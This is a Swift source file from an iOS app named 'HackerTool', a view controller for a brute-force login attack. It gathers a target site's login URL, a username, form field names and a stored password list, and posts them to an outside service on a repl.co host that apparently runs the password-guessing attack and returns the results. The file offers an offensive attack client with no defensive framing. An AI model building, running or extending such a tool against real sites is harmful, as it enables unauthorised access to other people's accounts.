//
//  BruteForceViewController.swift
//  HackerTool
//
//  Created by עילי בוקובזה on 08/06/2022.
//

import UIKit

class BruteForceViewController: UIViewController {

    @IBOutlet weak var urlTF: UITextField!
    @IBOutlet weak var userTF: UITextField!
    @IBOutlet weak var successMsgTF: UITextField!
    @IBOutlet weak var userFieldTF: UITextField!
    @IBOutlet weak var passFieldTF: UITextField!
    @IBOutlet weak var keysTF: UITextField!
    @IBOutlet weak var logView: UITextView!
    var passwords = ""
    
    override func viewDidLoad() {
        super.viewDidLoad()

        
        if UserDefaults.standard.stringArray(forKey: "bfkeywords") != nil {
            self.logView.text = "Using passwords files:\n"
            for pass in UserDefaults.standard.stringArray(forKey: "bfkeywords")! {
                self.logView.text = self.logView.text + "\n" + pass
                self.passwords += "\(pass),"
            }
        }else {
            self.logView.text = "No Passwords File found"
        }
        
    }
    

    @IBAction func attackButton(_ sender: Any) {
        
        
        self.logView.text = "Loading...\nThis step could take long up to 5 minutes"

        
        var iz = "https://Brute.selllit.repl.co/force"
        
        
        let urlz = URL(string: iz)!
        
        var request = URLRequest(url: urlz)
        request.httpMethod = "POST"
        let parameters: [String: Any] = [
            
            "url":self.urlTF.text!,
            "user":self.userTF.text!,
            "passwords":self.passwords,
            "succesmsg":self.successMsgTF.text!,
            "usField":self.userFieldTF.text!,
            "passField":self.passFieldTF.text!,
            "keys":self.keysTF.text!
                
            
          ]
        
        print("Parameters: \(parameters)")
        
        request.httpBody = parameters.percentEncoded()

        let taskz = URLSession.shared.dataTask(with: request) { data, response, error in
            guard let data = data,
                let response = response as? HTTPURLResponse,
                error == nil else {                                              // check for fundamental networking error
                print("error", error ?? "Unknown error")
                return
            }

            guard (200 ... 299) ~= response.statusCode else {                    // check for http errors
                print("statusCode should be 2xx, but is \(response.statusCode)")
                print("response = \(response)")
                return
            }

            let responseString = String(data: data, encoding: .utf8) as! String
            
            DispatchQueue.main.async {
                self.logView.text = "Results: \(responseString)"
            }
            
        }

        taskz.resume()
    }
    
}
